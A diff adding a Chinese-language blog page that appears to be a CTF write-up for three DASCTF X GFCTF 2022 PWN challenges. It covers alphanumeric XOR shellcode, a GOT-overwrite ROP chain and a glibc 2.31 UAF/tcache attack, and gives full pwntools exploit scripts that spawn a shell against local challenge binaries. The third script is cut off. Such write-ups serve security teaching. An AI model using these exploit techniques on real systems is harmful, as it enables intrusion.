@@ -1,0 +1,790 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/wod.jpg">
+  <link rel="icon" href="/img/wod.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CH13hh">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1!5!题目保护情况 64位ida逆向 题目很明确让我们写shellcode，但是做了一些检查我们进入函数看看  分析那么思路很明确就是可见字符shellcode的编写，先看看我们能用什么  那么可以看见，我们可以用异或，没有pop rsi;pop rdi；还有syscall等命令可以用，pop rdi的机器码是\x5f,而pop rsi的机器码是\x5e,syscall的机器码是\x0f\x05">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF X GFCTF 2022十月挑战赛-PWN-WP">
+<meta property="og:url" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/index.html">
+<meta property="og:site_name" content="CH13hh">
+<meta property="og:description" content="1!5!题目保护情况 64位ida逆向 题目很明确让我们写shellcode，但是做了一些检查我们进入函数看看  分析那么思路很明确就是可见字符shellcode的编写，先看看我们能用什么  那么可以看见，我们可以用异或，没有pop rsi;pop rdi；还有syscall等命令可以用，pop rdi的机器码是\x5f,而pop rsi的机器码是\x5e,syscall的机器码是\x0f\x05">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727141614221.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727151036170.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727151137542.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727151420684.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727152321660.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727152421298.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727153313531.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155125080.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155253935.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155403448.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155649490.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155808525.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727160203968.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727160516271.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161116505.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161233654.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161357899.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161442747.png">
+<meta property="article:published_time" content="2024-07-27T06:13:19.000Z">
+<meta property="article:modified_time" content="2024-07-27T09:03:50.644Z">
+<meta property="article:author" content="CH13hh">
+<meta property="article:tag" content="赛题复现">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ch13hh.github.io/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727141614221.png">
+  
+  
+  
+  <title>DASCTF X GFCTF 2022十月挑战赛-PWN-WP - CH13hh</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ch13hh.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","app_key":"idRJngxDPrsuLA4G1dKyEewP","server_url":"https://awdkxtm4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>CH13hh</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/zhuye.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DASCTF X GFCTF 2022十月挑战赛-PWN-WP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-27 14:13" pubdate>
+          2024年7月27日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">DASCTF X GFCTF 2022十月挑战赛-PWN-WP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="1-5"><a href="#1-5" class="headerlink" title="1!5!"></a>1!5!</h2><h3 id="题目保护情况"><a href="#题目保护情况" class="headerlink" title="题目保护情况"></a><strong>题目保护情况</strong></h3><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727141614221.png" srcset="/img/loading.gif" lazyload alt="image-20240727141614221.png"></p>
+<h3 id="64位ida逆向"><a href="#64位ida逆向" class="headerlink" title="64位ida逆向"></a><strong>64位ida逆向</strong></h3><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727151036170.png" srcset="/img/loading.gif" lazyload alt="image-20240727151036170"></p>
+<p>题目很明确让我们写shellcode，但是做了一些检查我们进入函数看看</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727151137542.png" srcset="/img/loading.gif" lazyload alt="image-20240727151137542"></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>那么思路很明确就是<strong>可见字符shellcode的编写</strong>，先看看我们能用什么</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727151420684.png" srcset="/img/loading.gif" lazyload alt="image-20240727151420684"></p>
+<p>那么可以看见，我们可以用异或，没有pop rsi;pop rdi；还有syscall等命令可以用，pop rdi的机器码是<strong>\x5f,<strong>而pop rsi的机器码是</strong>\x5e</strong>,syscall的机器码是<strong>\x0f\x05</strong>,这些虽然都不能直接输入，但是我们可以通过异或（xor）来得到他们，例如syscall，可以通过</p>
+<p>\x41\x41和\x4e\x44来得到syscall</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727152321660.png" srcset="/img/loading.gif" lazyload alt="image-20240727152321660"></p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727152421298.png" srcset="/img/loading.gif" lazyload alt="image-20240727152421298"></p>
+<p>因为是小端序所以实际写入的时候写0x444e，那么还有一个问题想要用相同的方法得到pop rdi，和pop rsi，比较容易，如果是&#x2F;bin&#x2F;sh呢，而且本题限制的可见数字字符也比较多，所以<strong>思路是通过调用一个syscall_read来读取我们正常的shellcode</strong>，因为此时已经不用通过检查了，那么就可以得到shell了。</p>
+<p>那么继续现在还有rdx,和rax还没有解决，可以先调试到要执行代码的地方看看栈和寄存器的值</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727153313531.png" srcset="/img/loading.gif" lazyload alt="image-20240727153313531"></p>
+<p>那么可以看见此时rax正好是0，rdx的值是我们输入shellocde的地址，那么我们可以把rdx 和rax push到栈上然后分别pop给rdi和rsi，那么就可以完成系统调用read。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>通过xor，异或出syscall和pop rdi 和 rsi 放在rdx+某处的地方，然后一直pop rax（rax置为0）滑到执行push rdx 和push rax的地方最后执行sysacll</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155125080.png" srcset="/img/loading.gif" lazyload alt="image-20240727155125080"></p>
+<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./22sh&#x27;</span>)<br><br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor eax,0x31315756</span><br><span class="hljs-string">xor dword ptr[rdx+0x50],eax</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor eax,0x31314848</span><br><span class="hljs-string">xor dword ptr[rdx+0x50],eax</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor eax,0x3131444e</span><br><span class="hljs-string">xor dword ptr[rdx+0x52],eax</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment">#gdb.attach(io)</span><br>io.send((asm(shellcode).ljust(<span class="hljs-number">0x50</span>-<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;\x58&#x27;</span>)+<span class="hljs-string">b&#x27;\x52\x50&#x27;</span>+<span class="hljs-string">b&#x27;\x41&#x27;</span>*<span class="hljs-number">4</span>).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x58&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(shellcode)))<br><br>payload = <span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x100</span> + asm(shellcraft.sh())<br>io.send(payload)<br><br><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="R-P"><a href="#R-P" class="headerlink" title="R()P"></a>R()P</h2><h3 id="程序保护情况"><a href="#程序保护情况" class="headerlink" title="程序保护情况"></a>程序保护情况</h3><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155253935.png" srcset="/img/loading.gif" lazyload alt="image-20240727155253935"></p>
+<h3 id="64位ida逆向-1"><a href="#64位ida逆向-1" class="headerlink" title="64位ida逆向"></a>64位ida逆向</h3><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155403448.png" srcset="/img/loading.gif" lazyload alt="image-20240727155403448"></p>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>题目逻辑比较简单，大致让你上来输入一个4字节数据不能大于0x100，然后根据你输入的大小进行读入buf（buf大小0xc）有溢出，那么找一下gadget什么的</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155649490.png" srcset="/img/loading.gif" lazyload alt="image-20240727155649490"></p>
+<p>那么很不幸的是没有pop rdi 那一类的gadget给我们用，只能到程序去找了</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155808525.png" srcset="/img/loading.gif" lazyload alt="image-20240727155808525"></p>
+<p>看到这些想到了什么，syscall对吧，那么程序也没有syscall的onegadget给我们，那么还有一种思路就是修改read的got表，因为调用read的时候其实底层是通过系统调用来执行syscall_read的</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727160203968.png" srcset="/img/loading.gif" lazyload alt="image-20240727160203968"></p>
+<p>那么可以看见，就差一个字节就可以<strong>把read的got表换成syscall</strong>，那么怎么改呢？还记得前面说的，我们可以控制rsi，那么就可以实现任意地址写了，那么现在还有一个问题，rdi怎么办，如果要实现系统调用拿到shell，是需要rdi为&#x2F;bin&#x2F;sh的或者sh的，那么我们可以写入&#x2F;bin&#x2F;sh,那么我们看看有没有关于rdi的gadget</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727160516271.png" srcset="/img/loading.gif" lazyload alt="image-20240727160516271"></p>
+<p>那么我们找的一个edi的gadget,那么我们只需要把&#x2F;bin&#x2F;sh写入0x404018即可，然后跳到rax，那么就要保证rax是一个可以执行的地址。</p>
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>改read@got为syscall，将&#x2F;bin&#x2F;sh写入0x404018中，然后依次控制，rdx，rdi，rax，rsi，因为要控制rdx的时候rdi会被清0，所以要按着顺序来，最后得到shell。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./rpp&#x27;</span>)<br>elf =ELF(<span class="hljs-string">&#x27;./rpp&#x27;</span>)<br>size = <span class="hljs-string">b&#x27;\x00\x01\x00\x00&#x27;</span><br>gdb.attach(io)<br>io.send(size)<br><br>ret = <span class="hljs-number">0x40115A</span><br>mov_edi_jmp = <span class="hljs-number">0x0000000000401099</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> +p32(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) +<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">4</span> +<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">4</span>+ p64(ret)<br>payload += p64(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x404018</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xdeadbeef</span>)+p64(ret)<br>io.send(payload)<br>pause()<br>io.send(<span class="hljs-string">&#x27;\xe0&#x27;</span>)<br>pause()<br>io.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>pause()<br>io.send(size)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + p32(<span class="hljs-number">0x40116D</span>) + <span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">4</span> +<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">4</span> + p64(<span class="hljs-number">0x40115D</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x40116D</span>) + p64(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x40116D</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(mov_edi_jmp)<br>payload += p64(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x3b</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xdeadbeef</span>)  + p64(<span class="hljs-number">0x401141</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><br>io.send(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Magic-Book"><a href="#Magic-Book" class="headerlink" title="Magic_Book"></a>Magic_Book</h2><h3 id="程序保护情况-1"><a href="#程序保护情况-1" class="headerlink" title="程序保护情况"></a>程序保护情况</h3><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161116505.png" srcset="/img/loading.gif" lazyload alt="image-20240727161116505"></p>
+<h3 id="64位ida载入"><a href="#64位ida载入" class="headerlink" title="64位ida载入"></a>64位ida载入</h3><p>首先最引入注意的是有一次<strong>UAF</strong>的机会</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161233654.png" srcset="/img/loading.gif" lazyload alt="image-20240727161233654"></p>
+<p>add最多申请18个堆块，然后最大不超过0x100</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161357899.png" srcset="/img/loading.gif" lazyload alt="image-20240727161357899"></p>
+<p>然后还有正常的free，没有UAF</p>
+<p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161442747.png" srcset="/img/loading.gif" lazyload alt="image-20240727161442747"></p>
+<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>虽然有UAF，但是本题版本是2.31的，我们知道在2.29之后的glibc，对double_free增加了一个检查机制，也就是key机制，它保存在bk指针处，它的值是tcache_perthread_struct，在free的时候如果发现链表中存在这个堆块那么就会报错。并且本题没有show功能，如果要泄露libc，可以考虑打io去爆破。</p>
+<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过申请堆块7让接下来要double_free的堆块进入unsortebin，那么它bk指针的key就被修改了，然后在free一次让他加入tachbin链表中，那么实现了一个堆块即在unsortbin中又在tachbin链表中，然后通过申请堆块改变tachbin堆块的fd指针实现leak libc，然后可以继续修改unsortbin头部的大小进行向下申请（注意要伪造prev size），修改下一个fd指针为free_hook，进而通过申请修改为system。</p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>有个小点，就是需要两条tachbin链，因为第一次leak libc已经破坏了一个了，所以接下来还需要另一条链来完成接下来的操作，还要一个就是进入unsortbin的时候先free高地址的，然后free低地址，这样会合并，然后继续伪造堆块延长unsortbin，使其可以渗透进tachbin中</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 